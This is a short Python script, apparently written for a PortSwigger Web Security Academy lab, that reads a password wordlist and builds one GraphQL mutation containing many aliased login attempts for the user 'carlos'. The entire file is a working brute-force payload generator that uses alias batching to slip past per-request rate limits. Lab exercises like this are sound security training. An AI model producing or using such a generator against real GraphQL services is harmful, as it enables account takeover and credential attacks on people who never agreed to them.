wordlist_file = '../Portswigger_lists/password_list.txt'
output_file = 'mutations.txt'

mutation_start = "mutation {"

mutation_template = """
    bruteforce{}: login(input: {{
        username: "carlos",
        password: "{}"
    }}) {{
        token
        success
    }}
"""

mutation_end = "}"

with open(output_file, 'w') as f_out:
    f_out.write(mutation_start)
    f_out.write('\n')

    with open(wordlist_file, 'r') as f_wordlist:
        mutation_count = 0
        for line in f_wordlist:
            password = line.strip()

            mutation = mutation_template.format(mutation_count, password)
            f_out.write(mutation)
            f_out.write('\n')  

            mutation_count += 1

    f_out.write(mutation_end)
    f_out.write('\n')

print(f"Mutations have been written to {output_file}")
